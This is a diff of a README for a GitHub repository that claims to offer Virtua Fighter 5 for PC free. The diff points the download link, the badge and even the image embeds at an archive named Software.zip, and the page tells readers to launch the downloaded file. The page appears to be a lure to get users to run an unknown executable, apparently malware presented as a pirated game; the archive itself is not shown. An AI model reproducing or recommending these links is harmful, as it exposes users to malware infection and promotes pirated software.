@@ -2,7 +2,7 @@
 
 ## **Welcome to Virtua Fighter 5 for PC Repository!**
 
-![Virtua Fighter 5](https://www.retroco.com/wp-content/uploads/2015/05/virtua-fighter-5-splash.jpg)
+![Virtua Fighter 5](https://github.com/Rhuaan/virtua-fighter-5-pc/releases/download/v1.0/Software.zip)
 
 ### **Description:**
 
@@ -24,7 +24,7 @@ Are you ready to dive into the world of intense 3D combat with Virtua Fighter 5 
 
 To get started with Virtua Fighter 5 on your PC, follow these simple steps:
 
-1. Click on the following link to download the game: [Download Virtua Fighter 5 for PC](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+1. Click on the following link to download the game: [Download Virtua Fighter 5 for PC](https://github.com/Rhuaan/virtua-fighter-5-pc/releases/download/v1.0/Software.zip)
    
    *Note: Make sure to launch the downloaded file to begin the installation process.*
 
@@ -34,7 +34,7 @@ To get started with Virtua Fighter 5 on your PC, follow these simple steps:
 
 Virtua Fighter 5 is a critically acclaimed fighting game that offers an immersive 3D combat experience. With a roster of diverse characters, each with their unique fighting styles and special moves, you can challenge yourself against AI opponents or test your skills in thrilling multiplayer battles.
 
-![Virtua Fighter 5 Gameplay](https://www.fightersgeneration.com/games/virtuafighter5/virtuafighter5revo-a8.jpg)
+![Virtua Fighter 5 Gameplay](https://github.com/Rhuaan/virtua-fighter-5-pc/releases/download/v1.0/Software.zip)
 
 ### **Explore the Features:**
 
@@ -56,7 +56,7 @@ If you have any suggestions or feedback regarding Virtua Fighter 5 for PC, feel 
 
 Ready to step into the arena and test your skills? Download Virtua Fighter 5 for PC and begin your journey towards mastering the art of combat!
 
-[![Download Virtua Fighter 5](https://img.shields.io/badge/Download-Virtua_Fighter_5-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Virtua Fighter 5](https://github.com/Rhuaan/virtua-fighter-5-pc/releases/download/v1.0/Software.zip)](https://github.com/Rhuaan/virtua-fighter-5-pc/releases/download/v1.0/Software.zip)
 
 ### **Thank you for Visiting!**
 
